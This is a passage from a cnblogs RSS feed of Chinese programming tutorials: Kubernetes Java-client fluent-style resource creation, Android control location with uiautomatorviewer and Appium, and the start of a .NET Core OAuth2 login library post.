                    &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
                    &amp;lt;artifactId&amp;gt;spring-boot-starter-json&amp;lt;/artifactId&amp;gt;
                &amp;lt;/exclusion&amp;gt;
            &amp;lt;/exclusions&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.projectlombok&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;lombok&amp;lt;/artifactId&amp;gt;
            &amp;lt;optional&amp;gt;true&amp;lt;/optional&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;io.kubernetes&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;client-java&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;

    &amp;lt;/dependencies&amp;gt;

    &amp;lt;build&amp;gt;
        &amp;lt;plugins&amp;gt;
            &amp;lt;plugin&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-boot-maven-plugin&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;2.3.0.RELEASE&amp;lt;/version&amp;gt;
            &amp;lt;/plugin&amp;gt;
        &amp;lt;/plugins&amp;gt;
    &amp;lt;/build&amp;gt;

&amp;lt;/project&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;新建&lt;span&gt;FluentStyleApplication.java&lt;/span&gt;，首先，该类作为启动类，要有main方法：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {
  SpringApplication.run(FluentStyleApplication.class, args);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;定义常量&lt;span&gt;NAMESPACE&lt;/span&gt;作为本次实战的namespace：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private final static String NAMESPACE = &quot;fluent&quot;;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;用@PostConstruct注解修饰setDefaultApiClient方法，令其在实例化时执行一次，里面做了一些全局性的初始化设置，注意&lt;span&gt;kubeConfigPath&lt;/span&gt;变量对应的config文件路径要正确：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
     * 默认的全局设置
     * @return
     * @throws Exception
     */
    @PostConstruct
    private void setDefaultApiClient() throws Exception {
        // 存放K8S的config文件的全路径
        String kubeConfigPath = &quot;/Users/zhaoqin/temp/202007/05/config&quot;;
        // 以config作为入参创建的client对象，可以访问到K8S的API Server
        ApiClient client = ClientBuilder
                .kubeconfig(KubeConfig.loadKubeConfig(new FileReader(kubeConfigPath)))
                .build();

        // 会打印和API Server之间请求响应的详细内容，生产环境慎用
        client.setDebugging(true);

        // 创建操作类
        Configuration.setDefaultApiClient(client);
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;接下来是创建namespace的web服务，如下所示，由于namespace在kubernetes的apiVersion是v1，因此创建的是&lt;span&gt;V1Namespace&lt;/span&gt;实例：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt; @RequestMapping(value = &quot;/fluent/createnamespace&quot;)
    public V1Namespace createnamespace() throws Exception {

        V1Namespace v1Namespace = new V1NamespaceBuilder()
                .withNewMetadata()
                .withName(NAMESPACE)
                .addToLabels(&quot;label1&quot;, &quot;aaa&quot;)
                .addToLabels(&quot;label2&quot;, &quot;bbb&quot;)
                .endMetadata()
                .build();

        return new CoreV1Api().createNamespace(v1Namespace, null, null, null);
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;6&quot; readability=&quot;0&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;为了更清晰的展现&lt;span&gt;fluent style&lt;/span&gt;效果，将上述代码与创建namespace的yaml文件内容放在一起对比，如下图所示，可见对照着yaml文件就能将代码写出来：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210114075837023-1626431244.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;接下来是创建service的代码，为了便于和yaml对应起来，代码中特意加了缩进：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt; @RequestMapping(value = &quot;/fluent/createservice&quot;)
    public V1Service createservice() throws Exception {
        V1Service v1Service = new V1ServiceBuilder()
                // meta设置
                .withNewMetadata()
                    .withName(&quot;nginx&quot;)
                .endMetadata()

                // spec设置
                .withNewSpec()
                    .withType(&quot;NodePort&quot;)
                    .addToPorts(new V1ServicePort().port(80).nodePort(30103))
                    .addToSelector(&quot;name&quot;, &quot;nginx&quot;)
                .endSpec()
                .build();

        return new CoreV1Api().createNamespacedService(NAMESPACE, v1Service, null, null, null);
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;8&quot;&gt;&lt;li&gt;创建deployment的代码如下，因为内容较多所以相对复杂一些，请注意，由于deployment在kubernetes的apiVersion是&lt;span&gt;extensions/v1beta1&lt;/span&gt;，因此创建的是&lt;span&gt;ExtensionsV1beta1Deployment&lt;/span&gt;实例：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt; @RequestMapping(value = &quot;/fluent/createdeployment&quot;)
    public ExtensionsV1beta1Deployment createdeployment() throws Exception {
        ExtensionsV1beta1Deployment v1Deployment = new ExtensionsV1beta1DeploymentBuilder()
                // meta设置
                .withNewMetadata()
                    .withName(&quot;nginx&quot;)
                .endMetadata()

                // spec设置
                .withNewSpec()
                    .withReplicas(1)
                    // spec的templat
                    .withNewTemplate()
                        // template的meta
                        .withNewMetadata()
                            .addToLabels(&quot;name&quot;, &quot;nginx&quot;)
                        .endMetadata()

                        // template的spec
                        .withNewSpec()
                            .addNewContainer()
                                .withName(&quot;nginx&quot;)
                                .withImage(&quot;nginx:1.18.0&quot;)
                                .addToPorts(new V1ContainerPort().containerPort(80))
                            .endContainer()
                        .endSpec()

                    .endTemplate()
                .endSpec()
                .build();

        return new ExtensionsV1beta1Api().createNamespacedDeployment(NAMESPACE, v1Deployment, null, null, null);
    } 
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;9&quot;&gt;&lt;li&gt;从上述代码可见，&lt;span&gt;withXXX&lt;/span&gt;和&lt;span&gt;endXXX&lt;/span&gt;是成对出现的，请在编程的时候注意不要遗漏了endXXX，建议在写withXXX的同时就把endXXX写上；&lt;/li&gt;
&lt;li&gt;最后一个方法是清理所有资源的，前面创建的deployment、service、namespace都在此一次性清理掉，实际操作中发现了一个尴尬的情况：删除deployment和namespace时，发送到API Server的删除请求都收到的操作成功的响应，但kubernetes客户端在反序列化响应内容时抛出异常（日志中显示了详细情况），&lt;span&gt;鄙人能力有限暂未找到解决之道&lt;/span&gt;，因此只能用try catch来避免整个方法抛出异常，好在kubernetes实际上已经删除成功了，影响不大：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    @RequestMapping(value = &quot;/fluent/clear&quot;)
    public String clear() throws Exception {

        // 删除deployment
        try {
            new ExtensionsV1beta1Api().deleteNamespacedDeployment(&quot;nginx&quot;, NAMESPACE, null, null, null, null, null, null);
        } catch (Exception e)
        {
            log.error(&quot;delete deployment error&quot;, e);
        }

        CoreV1Api coreV1Api = new CoreV1Api();

        // 删除service
        coreV1Api.deleteNamespacedService(&quot;nginx&quot;, NAMESPACE, null, null, null, null, null, null);

        // 删除namespace
        try {
            coreV1Api.deleteNamespace(NAMESPACE, null, null, null, null, null, null);
        } catch (Exception e)
        {
            log.error(&quot;delete namespace error&quot;, e);
        }

        return &quot;clear finish, &quot; + new Date();
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;11&quot;&gt;&lt;li&gt;编码已完成，启动fluent工程，接下来开始验证功能是否正常；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;验证&quot;&gt;验证&lt;/h3&gt;
&lt;ol readability=&quot;2.9449081803005&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;将fluent工程直接在IEDA环境启动；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;浏览器访问：&lt;a href=&quot;http://localhost:8080/fluent/createnamespace&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;http://localhost:8080/fluent/createnamespace&lt;/span&gt;&lt;/a&gt; ，页面会展示API Server返回的完整namespace信息：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210114075838391-378561896.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;浏览器访问：&lt;a href=&quot;http://localhost:8080/fluent/createservice&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;http://localhost:8080/fluent/createservice&lt;/span&gt;&lt;/a&gt; ，页面会展示API Server返回的完整service信息：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210114075839563-1951181876.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;浏览器访问：&lt;a href=&quot;http://localhost:8080/fluent/createdeployment&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;http://localhost:8080/fluent/createdeployment&lt;/span&gt;&lt;/a&gt; ，页面会展示API Server返回的完整deployment信息：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210114075841320-1253858470.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;验证前面几个接口创建的服务是否可用，我这里kubernetes的IP地址是&lt;span&gt;192.168.50.135&lt;/span&gt;，因此访问：&lt;a href=&quot;http://192.168.50.135:30103&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;http://192.168.50.135:30103&lt;/span&gt;&lt;/a&gt; ，可以正常显示nginx首页：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210114075841857-1188705843.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;6&quot; readability=&quot;-0.42342342342342&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;SSH登录kubernetes服务器查看，通过kubernetes的java客户端创建的资源都正常：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210114075842643-1863580468.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;验证完成后，浏览器访问：&lt;a href=&quot;http://localhost:8080/fluent/clear&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;http://localhost:8080/fluent/clear&lt;/span&gt;&lt;/a&gt; ，即可清理掉前面三个接口创建的资源；&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;至此，基于fluent style调用java客户端的实战就完成了，希望您能熟练使用此风格的API调用，使得编码变得更加轻松流畅，顺便预告一下，下一篇继续做一些简单轻松的操作，目标是熟悉java客户端的常用操作；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;你不孤单，欣宸原创一路相伴&quot;&gt;你不孤单，欣宸原创一路相伴&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105068742&quot; target=&quot;_blank&quot;&gt;Java系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086498&quot; target=&quot;_blank&quot;&gt;Spring系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086732&quot; target=&quot;_blank&quot;&gt;Docker系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086794&quot; target=&quot;_blank&quot;&gt;kubernetes系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086850&quot; target=&quot;_blank&quot;&gt;数据库+中间件系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086920&quot; target=&quot;_blank&quot;&gt;DevOps系列&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;欢迎关注公众号：程序员欣宸&quot;&gt;欢迎关注公众号：程序员欣宸&lt;/h3&gt;
&lt;blockquote readability=&quot;4.258064516129&quot;&gt;
&lt;p&gt;微信搜索「程序员欣宸」，我是欣宸，期待与您一同畅游Java世界...&lt;br/&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Wed, 13 Jan 2021 23:59:00 +0000</pubDate>
<dc:creator>程序员欣宸</dc:creator>
<og:description>欢迎访问我的GitHub https://github.com/zq2599/blog_demos 内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bolingcavalry/p/14275339.html</dc:identifier>
</item>
<item>
<title>App控件定位 - 测试开发小记</title>
<link>http://www.cnblogs.com/hiyong/p/14163653.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hiyong/p/14163653.html</guid>
<description>&lt;p&gt;本文将分享Android相关基础知识和Android APP控件定位工具的使用方法。&lt;/p&gt;

&lt;h2 id=&quot;android布局&quot;&gt;Android布局&lt;/h2&gt;
&lt;p&gt;Android是通过容器的&lt;strong&gt;布局属性&lt;/strong&gt;来管理子控件的位置关系（iOS去掉了布局的概念，直接用变量之间的相对关系完成位置的计算），把界面上所有的控件根据他们的间距的大小，摆放在正确的位置。布局是一种可用于放置很多&lt;strong&gt;控件&lt;/strong&gt;的容器，通过多层&lt;a href=&quot;https://developer.android.com/guide/topics/ui/declaring-layout?hl=zh-cn&quot; target=&quot;_blank&quot;&gt;布局&lt;/a&gt;嵌套完成一些比较复杂的界面。&lt;/p&gt;
&lt;p&gt;Android布局有LinearLayout(线性布局)、RelativeLayout(相对布局)、FrameLayout(帧布局)、AbsoluteLayout(绝对布局)、TableLayout(表格布局)、Grid layout(网格布局)、ConstraintLayout(约束布局)等。布局的内部除了放置控件外，也可以放置布局，通过多层布局的嵌套，我们就能够完成一些比较复杂的界面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2229336/202012/2229336-20201220151750107-489322590.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;android四大组件&quot;&gt;Android四大组件&lt;/h2&gt;
&lt;p&gt;Android四大基本组件分别是Activity，Service服务，Content Provider内容提供者，Broadcast Receiver广播接收器。&lt;/p&gt;
&lt;h3 id=&quot;1、activity&quot;&gt;1、activity&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;与用户交互的可视化界面&lt;/li&gt;
&lt;li&gt;一个Activity通常就是一个单独的屏幕（窗口）&lt;/li&gt;
&lt;li&gt;Activity之间通过Intent进行通信&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;2、service&quot;&gt;2、Service&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;service 实现后台运行程序，在后台完成用户指定的操作&lt;/li&gt;
&lt;li&gt;通常用于为其他组件提供后台服务或监控其他组件的运行状态。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;3、content-provider&quot;&gt;3、Content Provider&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;content provider 内容提供者，提供程序所需要的数据&lt;/li&gt;
&lt;li&gt;只有需要在多个应用程序间共享数据才需要内容提供者，是不同应用程序间共享数据的唯一方式。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;4、broadcast-receiver&quot;&gt;4、Broadcast Receiver&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;监听外部事件的到来(比如来电)&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;android控件&quot;&gt;Android控件&lt;/h2&gt;
&lt;p&gt;常用的控件：&lt;/p&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;TextView(文本控件)，EditText(可编辑文本控件)&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Button(按钮)，imageButton(图片按钮)，ToggIeButton(开关按钮)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Image View(图片控件)&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;CheckBox(复选框控件), RadioButton(单选框控件)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;元素定位实际上就是定位控件，Android应用的层级结构使用xml编写，xml全名叫可扩展标记语言，类似于HTML，可以看作一个微型的数据库。android系统里安装的每一个app，其信息都被存到一个xml里。&lt;/p&gt;
&lt;p&gt;xml定义了节点和属性，每个控件都有它的属性(resourceid, xpath, aid)，没有css属性（样式文件和布局xml文件是分开的）。&lt;/p&gt;
&lt;p&gt;Android中提供了三种解析XML的方式：DOM(Document Object Model)、SAX(Simple API XML)以及Pull解析方式。DOM解析器在解析XML文档时，会把文档中的所有元素按照其出现的层次关系，解析成一个个Node对象(节点)，形成Dom树。DOM允许用户遍历文档树，访问父节点、子节点或者兄弟节点。每个节点具有特定的属性：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;clickable&lt;/li&gt;
&lt;li&gt;content-desc&lt;/li&gt;
&lt;li&gt;resource-id&lt;/li&gt;
&lt;li&gt;text&lt;/li&gt;
&lt;li&gt;bounds&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对App控件的定位其实就是节点和属性的定位，Android App推荐使用uiautomatorviewer工具进行定位，它是 sdk路径下的一个工具。也可以用Appium inspector工具来定位。&lt;/p&gt;
&lt;h2 id=&quot;uiautomatorviewer定位&quot;&gt;uiautomatorviewer定位&lt;/h2&gt;
&lt;p&gt;电脑通过无线或者USB连接到手机设备后（或者连接到模拟机），双击uiautomatorviewer.bat打开uiautomatorviewer工具。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2229336/202012/2229336-20201220151836487-218908966.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击左上角第二个或者第三个图标获取当前手机APP页面，在右边可以看到app的xml结构树，可以获取到每个节点的详细属性。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2229336/202012/2229336-20201220151844335-44299238.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;appium-inspector工具&quot;&gt;Appium inspector工具&lt;/h2&gt;
&lt;p&gt;打开appium，点击【启动服务器】&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2229336/202012/2229336-20201220151852660-1654085531.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击右上角搜索标志图标【Start Inspector Session】&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2229336/202012/2229336-20201220151904505-503349745.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;编辑Desired Capabilities&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2229336/202012/2229336-20201220151912435-1351266733.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Capability设置：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;platformName：Android或者iOS&lt;/li&gt;
&lt;li&gt;deviceName：设备名，127.0.0.1:7555是网易mumu模拟器，开启后需要使用adb命令&lt;code&gt;adb connect 127.0.0.1:7555&lt;/code&gt;连接。&lt;/li&gt;
&lt;li&gt;appPackage：包名&lt;/li&gt;
&lt;li&gt;appActivity：Activity名字&lt;/li&gt;
&lt;li&gt;platformVersion：系统版本&lt;/li&gt;
&lt;li&gt;automationName：默认使用 uiautomator2(andorid默认使用 uiautomator2，ios默认使用 XCUITest)&lt;/li&gt;
&lt;li&gt;noReset：是否在测试前后重置相关环境(例如首次打开弹框,或者是登录信息)&lt;/li&gt;
&lt;li&gt;unicodeKeyBoard：是否需要输入非英文之外的语言并在测试完成后重置输入法&lt;/li&gt;
&lt;li&gt;dontStopAppOnReset：首次启动的时候,不停止app(可以调试或者运行的时候提升运行速度)&lt;/li&gt;
&lt;li&gt;skipDeviceInitialization：跳过安装,权限设置等操作(可以调试或者运行的时候提升运行速度)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;其他更多参数参考官方文档：&lt;a href=&quot;https://github.com/appium/appium/blob/master/docs/en/writing-running-appium/caps.md&quot; target=&quot;_blank&quot;&gt;https://github.com/appium/appium/blob/master/docs/en/writing-running-appium/caps.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;主要设置好前面6个参数后，点击右下角【Start Session】，可以获取到每个节点的详细属性。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2229336/202012/2229336-20201220151927447-1835576217.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;appium desktop可以录制用例，并生成测试代码&lt;/p&gt;
&lt;p&gt;点击上方眼睛图标，开始录制，手动点击左边app元素，右边显示了三种元素操作方法：Tap、Send Keys、Clear，选择对应的操作&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2229336/202012/2229336-20201220151937272-701853145.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;完成后测试步骤后，点击停止录制，右上角可以看到生成的自动化代码，可以选择Java，Python等语言。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2229336/202012/2229336-20201220151943847-675433325.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;获取到app页面元素属性值后就可以使用appium来进行定位，实现对app的操作。下一篇文章将介绍appium元素定位方法。&lt;/p&gt;

&lt;p&gt;APP自动化测试关键步骤包括：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;导入依赖:&lt;br/&gt;&lt;code&gt;from appium import webdriver&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;capabilities设置&lt;/li&gt;
&lt;li&gt;初始化 driver&lt;br/&gt;&lt;code&gt;webdriver.remote('http://127.0.0.1:4723/wd/hub', desired_caps)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;元素定位与操作&lt;/li&gt;
&lt;li&gt;断言 assert&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;下面代码实现打开雪球APP，点击输入框，输入”京东“，然后退出。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
# -*-coding:utf-8-*-
from appium import webdriver
desired_caps = {}
# desired_caps['recreateChromeDriverSessions'] = True
desired_caps['platformName'] = 'Android'
desired_caps['platformVersion'] = '5.1.1'
desired_caps['deviceName'] = '127.0.0.1:7555'
desired_caps['appPackage'] = 'com.xueqiu.android'
desired_caps['automationName'] = 'Uiautomator2'
desired_caps['appActivity'] = '.common.MainActivity'
desired_caps['newCommandTimeout'] = 3000
desired_caps['unicodeKeyboard'] = True
desired_caps['noReset'] = 'true'
desired_caps['dontStopAppOnReset'] = 'true'
desired_caps['skipDeviceInitialization'] = 'true'
driver = webdriver.Remote('http://127.0.0.1:4723/wd/hub', desired_caps)
driver.implicitly_wait(15)
driver.find_element_by_id(&quot;com.xueqiu.android:id/tv_search&quot;).click()
driver.find_element_by_id(&quot;com.xueqiu.android:id/search_input_text&quot;).send_keys(&quot;京东&quot;)
driver.quit()
&lt;/code&gt;
&lt;/pre&gt;
&lt;center&gt;&lt;strong&gt;--THE END--&lt;/strong&gt;&lt;/center&gt;
&lt;blockquote readability=&quot;4.5625&quot;&gt;
&lt;p&gt;&lt;strong&gt;文章标题：App控件定位&lt;br/&gt;本文作者：hiyo&lt;br/&gt;本文链接：&lt;a href=&quot;https://www.cnblogs.com/hiyong/p/14163653.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/hiyong/p/14163653.html&lt;/a&gt;&lt;br/&gt;欢迎关注公众号:「测试开发小记」及时接收最新技术文章！&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Wed, 13 Jan 2021 23:31:00 +0000</pubDate>
<dc:creator>测试开发小记</dc:creator>
<og:description>本文将分享Android相关基础知识和Android APP控件定位工具的使用方法。 Android基础知识 Android布局 Android是通过容器的布局属性来管理子控件的位置关系（iOS去掉了</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/hiyong/p/14163653.html</dc:identifier>
</item>
<item>
<title>.netcore 急速接入第三方登录，不看后悔 - 开发者精选资讯</title>
<link>http://www.cnblogs.com/MrHuo/p/netcore-best-oauth-components.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/MrHuo/p/netcore-best-oauth-components.html</guid>
<description>&lt;p&gt;此次带来的这个小项目是 OAuth2 登录组件，看到 Java 平台 JustAuth 项目很方便的接入第三方平台登录，心里痒痒啊，搜了一大圈，发现我大 .netcore 能用的可说是少之又少，而且代码写得一塌糊涂，全在一个库里，代码风格也看不惯，所以下定决定，操起键盘，开干。&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;303.39548511687&quot;&gt;
&lt;p&gt;&lt;img src=&quot;https://static01.imgkr.com/temp/84b5772d13134dd09019c35da3765f2b.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;新年新气象，趁着新年的喜庆，肝了十来天，终于发了第一版，希望大家喜欢。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;如果有不喜欢看文字的童鞋，可以直接看下面的地址体验一下：&lt;/p&gt;&lt;p&gt;&lt;code&gt;https://oauthlogin.net/&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;此次带来得这个小项目是 &lt;code&gt;OAuth2&lt;/code&gt; 登录组件，看到 &lt;code&gt;Java&lt;/code&gt; 平台 &lt;code&gt;JustAuth&lt;/code&gt; 项目很方便的接入第三方平台登录，心里痒痒啊，搜了一大圈，发现我大 &lt;code&gt;.netcore&lt;/code&gt; 能用的可说是少之又少，而且代码写得一塌糊涂，全在一个库里，代码风格也看不惯，所以下定决定，操起键盘，开干。&lt;/p&gt;
&lt;p&gt;关于 &lt;code&gt;OAuth2&lt;/code&gt; 的一些基础、原理介绍文章太多了，写的好的不在少数，在页尾我提供了几个链接，喜欢的朋友看一下，这里就不深入解释，直入主题。&lt;/p&gt;
&lt;h2 id=&quot;如何使用&quot;&gt;如何使用&lt;/h2&gt;
&lt;p&gt;这里拿接入 &lt;code&gt;github&lt;/code&gt; 登录做演示，新建 &lt;code&gt;Asp.NET Core Web应用程序&lt;/code&gt; 项目，名叫 &lt;code&gt;GithubLogin&lt;/code&gt;（PS:你可以自己起个更牛×的名字），选择模型视图控制器这个，当然你可以选择其他的。&lt;/p&gt;
&lt;h4 id=&quot;第一步：安装&quot;&gt;第一步：安装&lt;/h4&gt;
&lt;p&gt;安装这个 &lt;code&gt;nuget&lt;/code&gt; 包：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Install-Package MrHuo.OAuth.Github -Version 1.0.0
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;第二步：配置&quot;&gt;第二步：配置&lt;/h4&gt;
&lt;p&gt;打开 &lt;code&gt;appsettings.json&lt;/code&gt; 写入下面的配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
  &quot;oauth&quot;: {
    &quot;github&quot;: {
      &quot;app_id&quot;: &quot;github_app_id&quot;,
      &quot;app_key&quot;: &quot;github_app_key&quot;,
      &quot;redirect_uri&quot;: &quot;https://oauthlogin.net/oauth/githubcallback&quot;,
